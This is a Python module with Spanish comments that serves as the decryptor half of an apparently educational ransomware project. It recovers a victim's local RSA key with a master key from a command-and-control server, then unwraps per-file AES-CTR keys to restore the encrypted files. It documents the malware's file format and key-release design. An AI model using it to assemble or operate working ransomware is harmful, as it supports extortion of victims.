"""@package d_crypto.py

Módulo encargado del descifrado de los ficheros marcados en el directorio objetivo.
1. Con la clave publica maestra (master.key) enviada desde C&C y el fichero de exponente local_private_key.enc se obtiene el exponente de la clave privada local. (dado que las opciones de recomposicion de la clave privada local en base al exponente no son triviales, trabajamos con local.key, proporcionada por el C&C)
2. De cada fichero codificado en el directorio (*.iv.key.enc) extraemos el vector de inicializacion binario, la clave simetrica cifrada por la clave publica local y el fichero codificado en AES-CTR-128
3. Desciframos la clave simetrica con la clave privada local (local.key). Si hemos regenerado esta a partir del exponente, genial! se usa en su sustitución.
4. Teniendo el vector de inicializacion y la clave de encriptado en formato binario, decodificamos el fichero correspondiente. Se repite paso 2 y 4 tantos ficheros existan.
5. Eliminamos ficheros de trabajo intermedios.

Modo de uso:

d_cripto.py ../"c&c" ../encriptado ../desencriptado

Siendo: 

../c&c : Ficheros cargados desde el servidor de comando y control
../encriptado : Ficheros encriptados del sistema
../desencriptado : Ficheros resultantes de aplicar las operaciones de desencriptado

Argumentos necesarios para el modulo: 3

El resultado es la creación de la carpeta ../deencriptado con los archivos desencriptados.
"""
import sys
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import shutil

#######
## La composicion de fichero file001.iv.key.enc - (1)IV - (2)KEY_ENC - (3)TXT_ENC
#######

# (1)IV binario
####################################################################
###########  LECTURAS DE LOS PRIMEROS 16 BYTES #####################
####################################################################
def read_first_16_bytes(file_path):
    with open(file_path, 'rb') as file:
        # Leer los primeros 16 bytes del archivo
        first_16_bytes = file.read(16)
        return first_16_bytes

# (2)KEY_ENC binario
####################################################################
###########  LECTURAS DE LOS SIGUIENTES 256 BYTES ##################
####################################################################
def read_next_256_bytes(file_path):
    with open(file_path, 'rb') as file:
        # Saltar los primeros 16 bytes
        file.seek(16)

        # Leer los siguientes 256 bytes
        next_256_bytes = file.read(256)
        return next_256_bytes

# (3)TXT_ENC
####################################################################
###########  LECTURAS DE LOS BYTES HASTA EOF #######################
####################################################################
def read_remaining_bytes(file_path):
    with open(file_path, 'rb') as file:
        # Saltar los primeros 16 bytes
        file.seek(16)

        # Leer los siguientes 256 bytes
        file.read(256)

        # Leer el resto del archivo
        remaining_bytes = file.read()
        return remaining_bytes


####################################################################
###########  DECODIFICADOR DE CLAVE LOCAL PRIVADA ##################
####################################################################
def decrypt_private_key(encrypted_key_path, master_key_path, output_key_path):
    # Cargar la clave privada maestra
    with open(master_key_path, "rb") as master_key_file:
        master_key = serialization.load_der_private_key(
            master_key_file.read(),
            password=None,  # Puedes proporcionar una contraseña si la clave está encriptada
            backend=default_backend()
        )

    # Cargar la clave privada local cifrada
    with open(encrypted_key_path, "rb") as encrypted_key_file:
        encrypted_key = encrypted_key_file.read()

    # Descodificar la clave privada local
    decrypted_key = master_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Guardar la clave privada descodificada en un archivo
    with open(output_key_path, "wb") as output_key_file:
        output_key_file.write(decrypted_key)

####################################################################
###########  DECODIFICADOR DE CLAVE ENCRIPTACION ###################
####################################################################
def decrypt_encryption_key(encrypted_key_path, private_key_path):
    # Cargar la clave privada local 
    ## (Ojo!! en este caso si se quiere ejecutar de forma correcta el ramsonware, se debería calcular la clave privada RSA desde el exponente privado alojado en "local.private.key", calculo no trivial...)
    with open(private_key_path, "rb") as private_key_file:
        private_key = serialization.load_der_private_key(
            private_key_file.read(),
            password=None,  # Puedes proporcionar una contraseña si la clave está encriptada
            backend=default_backend()
        )

    # Cargar la clave cifrada del archivo file001.enc.key
    with open(encrypted_key_path, "rb") as encrypted_key_file:
        encrypted_key = encrypted_key_file.read()

    # Descifrar la clave cifrada con la clave privada local
    encryption_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return encryption_key

####################################################################
#################  FUNCION DE DESENCRIPTADO ########################
####################################################################
def decrypt_file(encrypted_file_path, output_file_path, encryption_key, iv):
    # Configurar el cifrador simétrico con la clave y el IV
    cipher = Cipher(algorithms.AES(encryption_key), modes.CTR(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Cargar el archivo cifrado
    with open(encrypted_file_path, "rb") as encrypted_file:
        ciphertext = encrypted_file.read()

    # Descifrar el contenido
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Volcar el resultado al archivo descifrado
    with open(output_file_path, "wb") as output_file:
        output_file.write(plaintext)

####################################################################
#######  FUNCION DE OBTENCION DE FICHEROS EN DIRECTORIO ############
####################################################################
def obtener_ficheros_directorio(directorio):
    lista_ficheros = []
    
    for directorio_actual, carpetas, ficheros in os.walk(directorio):
        for fichero in ficheros:
            ruta_completa = os.path.join(directorio_actual, fichero)
            lista_ficheros.append(ruta_completa)

    return lista_ficheros

## Paso 0: Carga de parametros...
if len(sys.argv) != 4: 
    raise ValueError('Se esperan exactamente 3 argumentos. Ejemplo: d_cripto.py ../"c&c" ../encriptado ../desencriptado')
#OJO! Parametrizar el contenido de la carpeta C&C
#carpeta_cYc = "../c&c"
carpeta_cYc = sys.argv[1]

#OJO! Parametrizar la carpeta encriptado
#carpeta_encriptado = "../encriptado"
carpeta_encriptado = sys.argv[2]

#OJO! Parametrizar la carpeta de desencriptado
#carpeta_desencriptado = "../desencriptado"
carpeta_desencriptado = sys.argv[3]
os.makedirs(carpeta_desencriptado, exist_ok=True)


## Paso 1: Con la clave privada maestra (master.key), descodificamos la clave privada local (local.key.enc) y la volcamos al fichero local.private.key

master_key_path = carpeta_cYc+"/"+"master.key"
encrypted_key_path = carpeta_encriptado+"/"+"local_private_key.enc"
output_key_path = carpeta_desencriptado+"/"+"local.private.key"

decrypt_private_key(encrypted_key_path, master_key_path, output_key_path)

# Eliminamos fichero local_private_key.enc tras realizar el desencriptado
os.remove(encrypted_key_path)


## Paso 2: Extrae del archivo file001.iv.key.enc el IV y la clave simétrica cifrada. 
directorio_base = carpeta_encriptado

ficheros = obtener_ficheros_directorio(directorio_base)
for fichero in ficheros:
#    processing_file(public_local_key, fichero, "../encriptado/"+fichero)
    file_path = fichero
    iv_binario = read_first_16_bytes(file_path)
    key_binario = read_next_256_bytes(file_path)
    txt_enc = read_remaining_bytes(file_path)

    os.mkdir("extract")

    with open("extract/file001.iv", "wb") as iv_file:
        iv_file.write(iv_binario)
        iv_file.close()

    with open("extract/file001.enc.key", "wb") as enc_key_file:
        enc_key_file.write(key_binario)
        enc_key_file.close()

    with open("extract/file001.enc", "wb") as enc_file:
        enc_file.write(txt_enc)
        enc_file.close()

    ## Paso 3: Descifrar con la clave privada local (local.private.key), el fichero file001.enc.key para obtener la encription_key
    private_key_path = carpeta_cYc+"/"+"local.key"
    encrypted_key_path = "extract/file001.enc.key"

    decrypted_encryption_key = decrypt_encryption_key(encrypted_key_path, private_key_path)

    ## Paso 4: Con la clave simetrica (decrypted_encryption_key) y el IV descifrar el contenido de file001.enc y volcarlo en file001.dec
    encrypted_file_path = "extract/file001.enc"
    output_file_path = "extract/file001.dec"
    decrypt_file(encrypted_file_path, output_file_path, decrypted_encryption_key, iv_binario)

    ## FINAL: Mover el fichero a la carpeta de desencriptacion
    output_route_file = carpeta_desencriptado+"/"+file_path.replace(".iv.key.enc","").replace(carpeta_encriptado,"")
    print(output_route_file)
    os.makedirs(os.path.dirname(output_route_file), exist_ok=True)
    shutil.move("extract/file001.dec", output_route_file)

    shutil.rmtree("extract")

